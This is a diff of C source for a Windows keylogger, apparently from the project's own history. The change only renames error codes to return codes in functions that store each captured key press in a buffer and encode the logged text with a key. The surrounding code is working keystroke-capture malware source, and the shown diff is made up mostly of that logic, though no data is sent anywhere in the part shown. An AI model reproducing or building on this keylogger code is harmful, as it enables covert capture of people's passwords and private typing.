@@ -4,7 +4,7 @@
 
 // private method prototypes
 static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode);
-static ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s);
+static RET_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s);
 static void createKeyPairs(KEY_LOGGER* kLogger);
 
 KEY_LOGGER* initKeyLogger() {
@@ -72,17 +72,17 @@ BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode) {
     return FALSE;
 }
 
-ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
+RET_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
     KEY_PAIR* kp = kLogger->keyCodes[*vkCode];
-    if (kp == NULL) { return ECODE_NULL; }
-    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) { return ECODE_FULL_BUFF; }
+    if (kp == NULL) { return R_NULL; }
+    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) { return R_FULL_BUFF; }
 
     int encStart = kLogger->bufferPtr;  // number of bytes from the keyBuffer base pointer
     char* encodeStrPtr = kLogger->keyBuffer + encStart;
     
     if (isKeyUnprintable(kp)) {
         // write unprintable string to buffer
-        ERR_CODE ret = writeStrToBuffer(kLogger, kp->unprintableKeyStr);
+        RET_CODE ret = writeStrToBuffer(kLogger, kp->unprintableKeyStr);
         // we only want to encode the content that has been added!
         encode(encodeStrPtr, &kLogger->encKey);
         return ret;
@@ -94,7 +94,7 @@ ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
     kLogger->keyBuffer[kLogger->bufferPtr] = '\0';
     encode(encodeStrPtr, &kLogger->encKey); // this will only encode the single char
 
-    return ECODE_SUCCESS;
+    return R_SUCCESS;
 }
 
 /**
@@ -125,7 +125,7 @@ static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
  * Manually writes the characters from the string represenation of an
  * unprintable key into the key buffer, returing the appropriate code
  */
-static ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
+static RET_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
     // write each char of s into the buffer
     char* str = s;
     while (*str != '\0' && kLogger->bufferPtr < MAX_BUFF_LEN - 1) {
@@ -134,8 +134,8 @@ static ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
     kLogger->keyBuffer[kLogger->bufferPtr] = '\0';
 
     // if we have hit the end of the buffer return full buff error!
-    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) { return ECODE_FULL_BUFF; }
-    return ECODE_SUCCESS;
+    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) { return R_FULL_BUFF; }
+    return R_SUCCESS;
 }
 
 /**
